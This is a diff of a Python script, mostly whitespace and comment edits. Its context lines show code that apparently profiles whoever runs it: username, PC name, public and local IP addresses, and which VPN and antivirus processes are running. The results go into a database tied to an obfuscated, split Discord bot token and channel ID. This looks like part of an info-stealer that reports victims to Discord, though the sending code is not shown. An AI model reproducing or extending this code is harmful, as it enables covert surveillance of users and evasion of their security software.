@@ -28,7 +28,7 @@ DISCORD_BOT_TOKEN = f"{TOKEN_PART1}.{TOKEN_PART2}.{TOKEN_PART3}"
 DISCORD_CHANNEL_ID = '1280446406783402015'
 
 # Database configuration
-DB_FILENAME = "ketm_user_data.db"
+DB_FILENAME = "ketm_user_data.db"  # This file will be created in the same directory as your script
 
 # Word document for logging lookups
 DOCX_FILENAME = "lookup_results.docx"
@@ -65,11 +65,11 @@ def update_user_data(username, pc_name, public_ip, local_ip, vpn_status, antivir
     """Update the database with user information."""
     conn = sqlite3.connect(DB_FILENAME)
     cursor = conn.cursor()
+
     cursor.execute('SELECT id, run_count FROM user_data WHERE username = ?', (username,))
     result = cursor.fetchone()
-    
+
     if result:
-        # User exists, update the run count and other details
         user_id, run_count = result
         cursor.execute('''
             UPDATE user_data
@@ -77,12 +77,11 @@ def update_user_data(username, pc_name, public_ip, local_ip, vpn_status, antivir
             WHERE id = ?
         ''', (run_count + 1, pc_name, public_ip, local_ip, vpn_status, antivirus, user_id))
     else:
-        # New user, insert into database
         cursor.execute('''
             INSERT INTO user_data (username, pc_name, public_ip, local_ip, vpn_status, antivirus)
             VALUES (?, ?, ?, ?, ?, ?)
         ''', (username, pc_name, public_ip, local_ip, vpn_status, antivirus))
-    
+
     conn.commit()
     conn.close()
 
@@ -122,7 +121,7 @@ def check_vpn_status():
         'mullvad.exe': 'Mullvad VPN',
         'ivpn.exe': 'IVPN'
     }
-    
+
     vpn_status = "No"
     detected_vpn = []
     for process, name in vpn_processes.items():
@@ -133,7 +132,7 @@ def check_vpn_status():
                 detected_vpn.append(name)
         except subprocess.CalledProcessError:
             continue
-    
+
     return vpn_status, detected_vpn
 
 def check_antivirus_status():
@@ -153,7 +152,7 @@ def check_antivirus_status():
         'antivir.exe': 'Avira',
         'antimalware_service.exe': 'Microsoft Defender'
     }
-    
+
     detected_antivirus = []
     for process, name in antivirus_processes.items():
         try:
@@ -162,7 +161,7 @@ def check_antivirus_status():
                 detected_antivirus.append(name)
         except subprocess.CalledProcessError:
             continue
-    
+
     return detected_antivirus
 
 def gather_system_info():
